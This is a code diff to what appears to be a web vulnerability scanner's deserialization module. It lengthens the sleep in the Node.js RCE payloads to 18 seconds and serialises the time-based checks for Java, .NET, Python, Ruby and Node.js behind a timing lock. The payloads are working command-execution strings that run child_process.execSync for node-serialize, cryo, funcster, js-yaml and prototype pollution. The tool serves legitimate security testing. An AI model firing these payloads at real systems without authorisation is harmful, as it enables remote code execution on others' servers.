@@ -10,6 +10,7 @@ import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
 import com.omnistrike.framework.PayloadEncoder;
+import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
 
@@ -474,26 +475,26 @@ public class DeserializationScanner implements ScanModule {
     private static final String[][] NODEJS_PAYLOADS = {
             // node-serialize IIFE payloads
             {"node-serialize IIFE",
-                    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()\"}"},
+                    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 18')}()\"}"},
             {"node-serialize require",
                     "{\"rce\":\"_$$ND_FUNC$$_function(){var net=require('net');var cp=require('child_process')}()\"}"},
             // cryo deserialization
             {"cryo prototype pollution",
-                    "{\"__cryo_type__\":\"Function\",\"body\":\"return require('child_process').execSync('sleep 5')\"}"},
+                    "{\"__cryo_type__\":\"Function\",\"body\":\"return require('child_process').execSync('sleep 18')\"}"},
             // funcster deserialization
             {"funcster RCE",
-                    "{\"__js_function\":\"function(){require('child_process').execSync('sleep 5')}\"}"},
+                    "{\"__js_function\":\"function(){require('child_process').execSync('sleep 18')}\"}"},
             // js-yaml !!js/function
             {"js-yaml function",
-                    "!!js/function 'function(){require(\"child_process\").execSync(\"sleep 5\")}'"},
+                    "!!js/function 'function(){require(\"child_process\").execSync(\"sleep 18\")}'"},
             // node-serialize with Buffer
             {"node-serialize Buffer",
                     "{\"rce\":\"_$$ND_FUNC$$_function(){Buffer.from(require('child_process').execSync('id'))}()\"}"},
             // Prototype pollution leading to RCE
             {"constructor.prototype",
-                    "{\"__proto__\":{\"type\":\"Code\",\"value\":\"require('child_process').execSync('sleep 5')\"}}"},
+                    "{\"__proto__\":{\"type\":\"Code\",\"value\":\"require('child_process').execSync('sleep 18')\"}}"},
             {"constructor pollution",
-                    "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('sleep 5');x\"}}}"},
+                    "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('sleep 18');x\"}}}"},
     };
 
     // Additional PHP framework chains
@@ -1126,39 +1127,46 @@ public class DeserializationScanner implements ScanModule {
             String chainName = chainInfo[0];
             String payload = chainInfo[1]; // Base64 gadget chain
 
+            try {
+                TimingLock.acquire();
 
+                // Measure baseline time (multi-baseline for accuracy)
+                long baselineTime = measureTime(original, dp, dp.value);
+                long bt2 = measureTime(original, dp, dp.value);
+                long bt3 = measureTime(original, dp, dp.value);
+                baselineTime = Math.max(baselineTime, Math.max(bt2, bt3));
 
-            // Measure baseline time (multi-baseline for accuracy)
-            long baselineTime = measureTime(original, dp, dp.value);
-            long bt2 = measureTime(original, dp, dp.value);
-            long bt3 = measureTime(original, dp, dp.value);
-            baselineTime = Math.max(baselineTime, Math.max(bt2, bt3));
+                // Send payload
+                long payloadTime = measureTime(original, dp, payload);
 
-            // Send payload
-            long payloadTime = measureTime(original, dp, payload);
+                int threshold = config.getInt("deser.timeThreshold", 14000);
+                if (payloadTime >= baselineTime + threshold) {
+                    // Confirm
+                    long confirmTime = measureTime(original, dp, payload);
 
-            int threshold = config.getInt("deser.timeThreshold", 4000);
-            if (payloadTime >= baselineTime + threshold) {
-                // Confirm
-                long confirmTime = measureTime(original, dp, payload);
-
-                if (confirmTime >= baselineTime + threshold) {
-                    findingsStore.addFinding(Finding.builder("deser-scanner",
-                                    "Java Deserialization RCE - " + chainName,
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(url).parameter(dp.name)
-                            .evidence("Chain: " + chainName + " | Location: " + dp.location
-                                    + " | Baseline: " + baselineTime + "ms"
-                                    + " | Payload: " + payloadTime + "ms"
-                                    + " | Confirm: " + confirmTime + "ms")
-                            .description("Java deserialization RCE confirmed via " + chainName
-                                    + " gadget chain. Time-based confirmation with double-tap. "
-                                    + "Remediation: Do not deserialize untrusted data. "
-                                    + "Use JSON with strict typing or implement JEP 290 deserialization filters.")
-                            .payload(payload)
-                            .build());
-                    return;
+                    if (confirmTime >= baselineTime + threshold) {
+                        findingsStore.addFinding(Finding.builder("deser-scanner",
+                                        "Java Deserialization RCE - " + chainName,
+                                        Severity.CRITICAL, Confidence.FIRM)
+                                .url(url).parameter(dp.name)
+                                .evidence("Chain: " + chainName + " | Location: " + dp.location
+                                        + " | Baseline: " + baselineTime + "ms"
+                                        + " | Payload: " + payloadTime + "ms"
+                                        + " | Confirm: " + confirmTime + "ms")
+                                .description("Java deserialization RCE confirmed via " + chainName
+                                        + " gadget chain. Time-based confirmation with double-tap. "
+                                        + "Remediation: Do not deserialize untrusted data. "
+                                        + "Use JSON with strict typing or implement JEP 290 deserialization filters.")
+                                .payload(payload)
+                                .build());
+                        return;
+                    }
                 }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            } finally {
+                TimingLock.release();
             }
             perHostDelay();
         }
@@ -1250,32 +1258,41 @@ public class DeserializationScanner implements ScanModule {
             String chainName = chainInfo[0];
             String payload = chainInfo[1];
 
-            // Multi-baseline for accuracy
-            long baselineTime = measureTime(original, dp, dp.value);
-            long dbt2 = measureTime(original, dp, dp.value);
-            long dbt3 = measureTime(original, dp, dp.value);
-            baselineTime = Math.max(baselineTime, Math.max(dbt2, dbt3));
+            try {
+                TimingLock.acquire();
 
-            long payloadTime = measureTime(original, dp, payload);
+                // Multi-baseline for accuracy
+                long baselineTime = measureTime(original, dp, dp.value);
+                long dbt2 = measureTime(original, dp, dp.value);
+                long dbt3 = measureTime(original, dp, dp.value);
+                baselineTime = Math.max(baselineTime, Math.max(dbt2, dbt3));
 
-            int threshold = config.getInt("deser.timeThreshold", 4000);
-            if (payloadTime >= baselineTime + threshold) {
-                long confirmTime = measureTime(original, dp, payload);
-                if (confirmTime >= baselineTime + threshold) {
-                    findingsStore.addFinding(Finding.builder("deser-scanner",
-                                    ".NET Deserialization RCE (Time-based) - " + chainName,
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(url).parameter(dp.name)
-                            .evidence("Chain: " + chainName + " | Baseline: " + baselineTime + "ms"
-                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
-                            .description(".NET deserialization RCE confirmed via " + chainName
-                                    + " with time-based double-tap. "
-                                    + "Remediation: Do not use BinaryFormatter/SoapFormatter with untrusted data. "
-                                    + "Migrate to System.Text.Json with strict type handling.")
-                            .payload(payload)
-                            .build());
-                    return;
+                long payloadTime = measureTime(original, dp, payload);
+
+                int threshold = config.getInt("deser.timeThreshold", 14000);
+                if (payloadTime >= baselineTime + threshold) {
+                    long confirmTime = measureTime(original, dp, payload);
+                    if (confirmTime >= baselineTime + threshold) {
+                        findingsStore.addFinding(Finding.builder("deser-scanner",
+                                        ".NET Deserialization RCE (Time-based) - " + chainName,
+                                        Severity.CRITICAL, Confidence.FIRM)
+                                .url(url).parameter(dp.name)
+                                .evidence("Chain: " + chainName + " | Baseline: " + baselineTime + "ms"
+                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
+                                .description(".NET deserialization RCE confirmed via " + chainName
+                                        + " with time-based double-tap. "
+                                        + "Remediation: Do not use BinaryFormatter/SoapFormatter with untrusted data. "
+                                        + "Migrate to System.Text.Json with strict type handling.")
+                                .payload(payload)
+                                .build());
+                        return;
+                    }
                 }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            } finally {
+                TimingLock.release();
             }
             perHostDelay();
         }
@@ -1346,34 +1363,41 @@ public class DeserializationScanner implements ScanModule {
             String desc = payloadInfo[0];
             String payload = payloadInfo[1];
 
+            try {
+                TimingLock.acquire();
 
+                // Multi-baseline for accuracy
+                long baselineTime = measureTime(original, dp, dp.value);
+                long pbt2 = measureTime(original, dp, dp.value);
+                long pbt3 = measureTime(original, dp, dp.value);
+                baselineTime = Math.max(baselineTime, Math.max(pbt2, pbt3));
 
-            // Multi-baseline for accuracy
-            long baselineTime = measureTime(original, dp, dp.value);
-            long pbt2 = measureTime(original, dp, dp.value);
-            long pbt3 = measureTime(original, dp, dp.value);
-            baselineTime = Math.max(baselineTime, Math.max(pbt2, pbt3));
+                long payloadTime = measureTime(original, dp, payload);
 
-            long payloadTime = measureTime(original, dp, payload);
+                int threshold = config.getInt("deser.timeThreshold", 14000);
+                if (payloadTime >= baselineTime + threshold) {
+                    long confirmTime = measureTime(original, dp, payload);
 
-            int threshold = config.getInt("deser.timeThreshold", 4000);
-            if (payloadTime >= baselineTime + threshold) {
-                long confirmTime = measureTime(original, dp, payload);
-
-                if (confirmTime >= baselineTime + threshold) {
-                    findingsStore.addFinding(Finding.builder("deser-scanner",
-                                    "Python Pickle Deserialization RCE",
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(url).parameter(dp.name)
-                            .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
-                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
-                            .description("Python pickle deserialization RCE confirmed via time-based payload. "
-                                    + "Remediation: Never unpickle untrusted data. Use JSON or implement "
-                                    + "hmac signing for pickle data.")
-                            .payload(payload)
-                            .build());
-                    return;
+                    if (confirmTime >= baselineTime + threshold) {
+                        findingsStore.addFinding(Finding.builder("deser-scanner",
+                                        "Python Pickle Deserialization RCE",
+                                        Severity.CRITICAL, Confidence.FIRM)
+                                .url(url).parameter(dp.name)
+                                .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
+                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
+                                .description("Python pickle deserialization RCE confirmed via time-based payload. "
+                                        + "Remediation: Never unpickle untrusted data. Use JSON or implement "
+                                        + "hmac signing for pickle data.")
+                                .payload(payload)
+                                .build());
+                        return;
+                    }
                 }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            } finally {
+                TimingLock.release();
             }
             perHostDelay();
         }
@@ -1387,29 +1411,38 @@ public class DeserializationScanner implements ScanModule {
             String payload = payloadInfo[1];
 
             // Time-based detection
-            long baselineTime = measureTime(original, dp, dp.value);
-            long rbt2 = measureTime(original, dp, dp.value);
-            baselineTime = Math.max(baselineTime, rbt2);
+            try {
+                TimingLock.acquire();
 
-            long payloadTime = measureTime(original, dp, payload);
+                long baselineTime = measureTime(original, dp, dp.value);
+                long rbt2 = measureTime(original, dp, dp.value);
+                baselineTime = Math.max(baselineTime, rbt2);
 
-            int threshold = config.getInt("deser.timeThreshold", 4000);
-            if (payloadTime >= baselineTime + threshold) {
-                long confirmTime = measureTime(original, dp, payload);
-                if (confirmTime >= baselineTime + threshold) {
-                    findingsStore.addFinding(Finding.builder("deser-scanner",
-                                    "Ruby Deserialization RCE - " + desc,
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(url).parameter(dp.name)
-                            .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
-                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
-                            .description("Ruby deserialization RCE confirmed. "
-                                    + "Remediation: Never use Marshal.load or YAML.load with untrusted data. "
-                                    + "Use JSON.parse or YAML.safe_load instead.")
-                            .payload(payload)
-                            .build());
-                    return;
+                long payloadTime = measureTime(original, dp, payload);
+
+                int threshold = config.getInt("deser.timeThreshold", 14000);
+                if (payloadTime >= baselineTime + threshold) {
+                    long confirmTime = measureTime(original, dp, payload);
+                    if (confirmTime >= baselineTime + threshold) {
+                        findingsStore.addFinding(Finding.builder("deser-scanner",
+                                        "Ruby Deserialization RCE - " + desc,
+                                        Severity.CRITICAL, Confidence.FIRM)
+                                .url(url).parameter(dp.name)
+                                .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
+                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
+                                .description("Ruby deserialization RCE confirmed. "
+                                        + "Remediation: Never use Marshal.load or YAML.load with untrusted data. "
+                                        + "Use JSON.parse or YAML.safe_load instead.")
+                                .payload(payload)
+                                .build());
+                        return;
+                    }
                 }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            } finally {
+                TimingLock.release();
             }
 
             // Error-based detection
@@ -1448,29 +1481,38 @@ public class DeserializationScanner implements ScanModule {
             String payload = payloadInfo[1];
 
             // Time-based detection
-            long baselineTime = measureTime(original, dp, dp.value);
-            long nbt2 = measureTime(original, dp, dp.value);
-            baselineTime = Math.max(baselineTime, nbt2);
+            try {
+                TimingLock.acquire();
 
-            long payloadTime = measureTime(original, dp, payload);
+                long baselineTime = measureTime(original, dp, dp.value);
+                long nbt2 = measureTime(original, dp, dp.value);
+                baselineTime = Math.max(baselineTime, nbt2);
 
-            int threshold = config.getInt("deser.timeThreshold", 4000);
-            if (payloadTime >= baselineTime + threshold) {
-                long confirmTime = measureTime(original, dp, payload);
-                if (confirmTime >= baselineTime + threshold) {
-                    findingsStore.addFinding(Finding.builder("deser-scanner",
-                                    "Node.js Deserialization RCE - " + desc,
-                                    Severity.CRITICAL, Confidence.FIRM)
-                            .url(url).parameter(dp.name)
-                            .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
-                                    + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
-                            .description("Node.js deserialization RCE confirmed. "
-                                    + "Remediation: Replace node-serialize/cryo/funcster with JSON.parse. "
-                                    + "Never deserialize untrusted data with eval or Function constructor.")
-                            .payload(payload)
-                            .build());
-                    return;
+                long payloadTime = measureTime(original, dp, payload);
+
+                int threshold = config.getInt("deser.timeThreshold", 14000);
+                if (payloadTime >= baselineTime + threshold) {
+                    long confirmTime = measureTime(original, dp, payload);
+                    if (confirmTime >= baselineTime + threshold) {
+                        findingsStore.addFinding(Finding.builder("deser-scanner",
+                                        "Node.js Deserialization RCE - " + desc,
+                                        Severity.CRITICAL, Confidence.FIRM)
+                                .url(url).parameter(dp.name)
+                                .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
+                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
+                                .description("Node.js deserialization RCE confirmed. "
+                                        + "Remediation: Replace node-serialize/cryo/funcster with JSON.parse. "
+                                        + "Never deserialize untrusted data with eval or Function constructor.")
+                                .payload(payload)
+                                .build());
+                        return;
+                    }
                 }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return;
+            } finally {
+                TimingLock.release();
             }
 
             // Error-based detection
